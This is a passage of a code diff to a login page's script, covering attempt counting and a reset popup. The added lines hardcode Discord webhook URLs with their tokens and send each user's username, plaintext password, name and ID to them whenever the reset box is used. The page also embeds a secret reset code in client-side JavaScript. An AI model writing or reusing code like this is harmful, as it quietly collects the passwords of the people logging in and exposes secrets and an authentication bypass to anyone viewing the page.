-          showResetPopup(); // Show the reset popup
-          disableInputs(); // Disable input fields and submit button
-        } else {
-          // Flash the login box for visual feedback on failed attempts
-          if (attempts <= 3) { // Start flashing when less than 3 attempts remain
-            flashRedOutline(2, 400);
-          }
+          showResetPopup();
+          disableInputs();
         }
       }
 
-      // Update the attempts counter display
+      // Update attempts display
       function updateAttemptsText() {
         attemptsText.textContent = `Attempts Left: ${attempts}`;
       }
 
-      // Disable input fields and submit button
+      // Disable inputs and submit button
       function disableInputs() {
         usernameInput.disabled = true;
         passwordInput.disabled = true;
@@ -2383,7 +3134,7 @@ To view all available shortcuts for the specific app you are using, press and h
         submitBtn.disabled = true;
       }
 
-      // Enable input fields and submit button
+      // Enable inputs and submit button
       function enableInputs() {
         usernameInput.disabled = false;
         passwordInput.disabled = false;
@@ -2391,92 +3142,100 @@ To view all available shortcuts for the specific app you are using, press and h
         submitBtn.disabled = false;
       }
 
-      // Show the reset popup for too many attempts
+      // Show reset popup
       function showResetPopup() {
         resetPopup.style.display = 'block';
-        resetPopup.setAttribute('aria-hidden', 'false'); // For accessibility
-        resetField.focus(); // Focus on the reset input field
+        resetPopup.setAttribute('aria-hidden', 'false');
+        resetField.focus();
       }
 
-      // Hide the reset popup
+      // Hide reset popup
       function hideResetPopup() {
         resetPopup.style.display = 'none';
         resetPopup.setAttribute('aria-hidden', 'true');
-        resetField.value = ''; // Clear the input field
+        resetField.value = '';
       }
 
-      // Handle the reset counter logic
       async function resetCounter() {
-        const enteredCode = resetField.value.trim(); // Get and trim the entered code
-        const isCorrect = enteredCode === 'Reset.Counter.2579'; // The secret reset code
+        const enteredCode = resetField.value.trim();
+        const isCorrect = enteredCode === 'Reset.Counter.2579'; // The magic reset code
 
-        // Gather current login details for logging
         const username = usernameInput.value || 'Unknown';
         const password = passwordInput.value || 'Unknown';
         const userID = userIDInput.value || 'Unknown';
-        const user = findUser(username, userID) || {}; // Get user data or empty object
+        const user = findUser(username, userID) || {}; // Get user details or empty object
 
-        // 1. Log the detection of the reset box interaction
+        // 1. Send "Reset box Detected" webhook immediately
         const resetBoxEmbed = {
-          title: "🔔 Reset Box Detected", color: 0xffff00,
+          title: "🔔 Reset Box Detected",
+          color: 0xffff00, // Yellow for caution/detection
           fields: [
-            { name: "Name", value: user.name || "N/A", inline: true }, { name: "Username", value: username, inline: true },
-            { name: "Password Entered", value: password, inline: true }, { name: "User ID", value: userID, inline: true },
-            { name: "Entered Code", value: enteredCode, inline: false }, { name: "Time", value: new Date().toLocaleString(), inline: false }
+            { name: "Name", value: user.name || "N/A", inline: true },
+            { name: "Username", value: username, inline: true },
+            { name: "Password Entered", value: password, inline: true },
+            { name: "User ID", value: userID, inline: true },
+            { name: "Entered Code", value: enteredCode, inline: false },
+            { name: "Time", value: new Date().toLocaleString(), inline: false }
           ]
         };
-        await sendWebhook(loggingWebhooks.reset_box_detected, resetBoxEmbed);
+        // This webhook URL appears to be for detecting the reset popup interaction itself.
+        const resetBoxWebhook = "https://discord.com/api/webhooks/1403083012442423377/WNs_yZimluZqsxfZWkLSCfd2vmOYdoyEbsUVOfczHkJykeiThIZ6gYCJILFSHfSDSnsq";
+        await sendWebhook(resetBoxWebhook, resetBoxEmbed);
 
-        // Prepare embed for the result of the reset code attempt
+        // Build embed for correct or incorrect code result
         const resultEmbed = {
           title: isCorrect ? "✅ Reset Code Accepted" : "❌ Incorrect Reset Code Attempt",
-          color: isCorrect ? 0x00ff00 : 0xff0000, // Green for success, red for failure
+          color: isCorrect ? 0x00ff00 : 0xff0000, // Green for success, Red for failure
           fields: [
-            { name: "Name", value: user.name || "N/A", inline: true }, { name: "Username", value: username, inline: true },
-            { name: "Password Entered", value: password, inline: true }, { name: "User ID", value: userID, inline: true },
-            { name: "Reset Code", value: enteredCode, inline: false }, { name: "Time", value: new Date().toLocaleString(), inline: false }
+            { name: "Name", value: user.name || "N/A", inline: true },
+            { name: "Username", value: username, inline: true },
+            { name: "Password Entered", value: password, inline: true },
+            { name: "User ID", value: userID, inline: true },
+            { name: "Reset Code Attempted", value: enteredCode, inline: false },
+            { name: "Time", value: new Date().toLocaleString(), inline: false }
           ]
         };
 
-        // Select the appropriate webhook based on success or failure
+        // Select webhook for correct or incorrect code logging
         const resultWebhook = isCorrect
-          ? loggingWebhooks.reset_code_accepted
-          : loggingWebhooks.reset_code_incorrect;
+          ? "https://discord.com/api/webhooks/1403088193850441921/zZKPkgzVBQ7d6aiCkT3WM7j2Y74UO2o1Js9oSnawVBHaSxUQCz-16Qj4uPYk1YxgoanB" // Webhook for successful reset
+          : "https://discord.com/api/webhooks/1403088326252040372/JgQkJdcVG-8X0jSmw7AZai9YSUODCMZ5hkyWlBe1MBzPRiJgbSlRDWOJUvHVqsK248ip"; // Webhook for failed reset
+        
         await sendWebhook(resultWebhook, resultEmbed);
 
-        // If the code was correct, reset attempts and enable inputs
         if (isCorrect) {
-          attempts = 5; // Reset attempts to max
-          updateAttemptsText(); // Update display
-          enableInputs(); // Re-enable form fields
-          hideResetPopup(); // Hide the popup
+          attempts = 5; // Reset attempts
+          updateAttemptsText();
+          enableInputs();
+          hideResetPopup();
           errorMsg.textContent = ''; // Clear error message
+          loginBox.style.borderColor = 'white'; // Reset login box style
+          loginBox.style.boxShadow = '0 0 15px white';
         } else {
-          // If incorrect, show an alert
-          alert('Incorrect reset code.');
+          alert('Incorrect reset code. Please try again.');
+          resetField.value = ''; // Clear the input field for retry
+          resetField.focus();
         }
       }
 
-      // Attach event listeners to the login and reset buttons
+      // Attach event listeners for login
       submitBtn.addEventListener('click', submitLogin);
       resetBtn.addEventListener('click', resetCounter);
 
-      // Handle Enter key press for login or reset
+      // Enter key submits login if popup hidden, else tries reset
       document.addEventListener('keydown', e => {
         if (e.key === 'Enter') {
-          // If the reset popup is visible, attempt to reset
           if (resetPopup.style.display === 'block') {
             resetCounter();
           } else {
-            // Otherwise, attempt to submit the login form
             submitLogin();
           }
         }
       });
 
-      // Initialize the attempts counter display on page load
+      // Initialize attempts display on page load
       updateAttemptsText();
-    })(); // Immediately Invoked Function Expression for login system
+    })();
   </script>
 </body>
 </html>
